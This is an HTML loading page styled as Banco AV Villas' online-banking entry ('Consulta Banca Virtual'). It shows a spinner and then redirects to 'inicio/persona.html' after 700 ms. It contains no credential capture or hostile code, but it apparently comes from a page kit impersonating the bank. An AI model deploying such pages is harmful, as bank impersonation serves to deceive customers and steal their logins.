<html>
    <head>
        <title>Consulta Banca Virtual | Banco AV Villas</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        <meta content="es" http-equiv="Content-Language">
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="theme-color" content="#FF0015">
        <link rel="icon" href="inicio/img/favicon.png">
        <script type="text/javascript" src="../../../js/jquery-3.6.0.min.js"></script>      
        <link href="css/style.css" rel="stylesheet">
        <link href="css/stylesheet.css" rel="stylesheet">               
        <style type="text/css">
            #fondo{
                position: fixed;
                width: 100%;
                height: 100%;
                left: 0;
                top: 0;
                background-color: #ffffff;
                z-index: 900;
            }

            #cargando{
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                z-index: 920;
            }
        </style>
    </head>
    <body>        
        <div id="fondo"></div>
        <img src="inicio/img/cargando.gif" id="cargando" width="140">
        <script type="text/javascript">
            function direccionar(){
                window.location.href = "inicio/persona.html"; 
            }

            $(document).ready(function() {
                setTimeout(direccionar, 700);
            });
        </script>
    </body>
</html>